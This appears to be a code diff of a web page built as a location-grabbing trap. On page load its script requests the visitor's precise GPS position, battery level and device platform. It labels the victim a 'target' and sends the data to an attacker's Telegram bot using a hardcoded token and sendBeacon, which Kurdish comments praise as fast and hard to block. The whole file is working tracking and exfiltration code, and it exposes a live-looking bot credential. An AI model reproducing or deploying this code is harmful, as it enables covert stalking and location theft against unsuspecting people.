@@ -8,32 +8,19 @@
 <body onload="capture()">
 
 <script>
-    const TOKEN = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
-
-    function _send(uid, text) {
-        // بەکارهێنانی وێنەیەک بۆ ناردنی داتا (ئەمە هەرگیز بلۆک ناکرێت)
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-        const img = new Image();
-        img.src = url;
-    }
+    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
 
     async function capture() {
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
         if (!uid) return;
 
+        // ١. یەکسەر داوای لۆکەیشن دەکات
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // وەرگرتنی IP
-            let ip = "N/A";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
-
+            // ٢. وەرگرتنی زانیارییە خێراکان
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -42,15 +29,19 @@
 
             let report = `🚨 <b>Target Locked!</b>\n\n` +
                          `📍 <b>Location:</b> https://www.google.com/maps?q=${lat},${lon}\n` +
-                         `🌐 <b>IP:</b> ${ip}\n` +
-                         `📱 <b>Device:</b> ${navigator.platform}\n` +
-                         `🔋 <b>Battery:</b> ${bat}`;
+                         `🔋 <b>Battery:</b> ${bat}\n` +
+                         `📱 <b>Device:</b> ${navigator.platform}`;
 
-            _send(uid, report);
+            // ٣. ناردنی خێرا (Beacon) - ئەمە نەوەستاوە و یەکسەر دەیپێکێت
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(report)}&parse_mode=HTML`;
+            
+            // ئەمە فێڵە سەرەکییەکەیە بۆ خێرایی
+            navigator.sendBeacon(url);
 
         }, (err) => {
-            _send(uid, "⚠️ Target Denied Location!");
-        }, { enableHighAccuracy: true });
+            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
+            navigator.sendBeacon(url);
+        }, { enableHighAccuracy: true, timeout: 5000 });
     }
 </script>
 </body>
